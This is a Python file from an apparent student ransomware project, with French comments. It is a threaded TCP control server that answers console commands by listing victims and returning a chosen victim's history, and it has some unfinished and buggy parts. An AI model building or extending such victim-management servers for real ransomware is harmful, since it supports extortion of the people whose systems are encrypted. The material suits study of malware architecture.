#!/usr/bin/python
# --------------------------------------------

# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : network

# --------------------------------------------
# Importations
# --------------------------------------------
import socket
import threading
from _thread import start_new_thread

import configgetter as config
import security
import os
import utile.data as udata


# --------------------------------------------
# Classes & Functions
# --------------------------------------------

print_lock = threading.Lock()

class server_tcp(object):

    def __init__(self, ip, port):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port
        self.encryptkey = os.urandom(32)

    def start_server(self):
        """
        Démarrage du serveur et maintient de celui-ci + gestion des 'commandes'
        """
        # Création de la socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print(f'$ Server started ! Waiting for clients...')
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
        # Max 10 clients
        s.listen(10)
        while True:
            # On accepte les connexions
            conn, addr = s.accept()
            # Ok
            print_lock.acquire()
            print(f'[+] New TCP Connexion from ' + str(addr[0]) + ":" + str(addr[1]))
            # Nouvelle connexion détectée : On créé un thread pour celle-ci
            start_new_thread(self.threaded, (conn,addr))
        # Implémentation sécurité : AES
        # conn.send(bytes(str(key), 'utf-8'))
        # conn.send(bytes(str(nonce), 'utf-8'))
        # conn.send(bytes(str(tag), 'utf-8'))
        # Fermeture de la connexion
        self.s.close()



    def gestion_msg(self, c,message):
        """
        Système de gestion des commandes envoyées par la console de contrôle
        """
        if message == '1':
            # On va interroger le serveur SQL depuis le serveur frontale pour des raisons
            # De sécurité...
            # On envoie la liste
            return udata.list_victim()
        elif message == '2':
            # On demande un ID en particulier pour une recherche d'historique
            c.send(bytes('Please provide an user ID for the history', 'utf-8'))
            # On attends l'ID en écoutant sur le serveur frontale
            id = c.recv(1024).decode()
            # On envoie l'historique
            return udata.history_req(id)
        elif message == '3':
            # C'est à faire
            return "Todo3"

    def threaded(self, c, sc):
        """
        Système de création de Threads..
        """
        print('New thread started')
        while True:
            try:
                # On écoute
                data = c.recv(1024).decode()
            except:
                print('Connexion closed. Kicking it out.')
                break
            if not data:
                print('Bye')
                # Suppression du thread + Reset connexion TCP --> Suppression Thread = Force close de la connexion
                print_lock.release()
                break
            # On print l'ip de la connexion et sa demande
            print(str(sc[0] + " >> " + data))
            # On construit une réponse grâce à la méthode gestion message
            rs = str(self.gestion_msg(c, data))
            # @Todo: Build header & send it before msg
            # On l'envoie
            c.send(bytes(rs, 'utf-8'))
        # On ferme la connexion du client lors de la fin de connexion
        c.close()

# On initialise l'objet serveur avec les paramètres ip et port contenu dans le fichier config
# Pour éviter le hard-coding et des modifications plus aisée...
srv = server_tcp(config.get_ip("../config.json"), config.get_port("../config.json"))
# On démarre le serveur
srv.start_server()
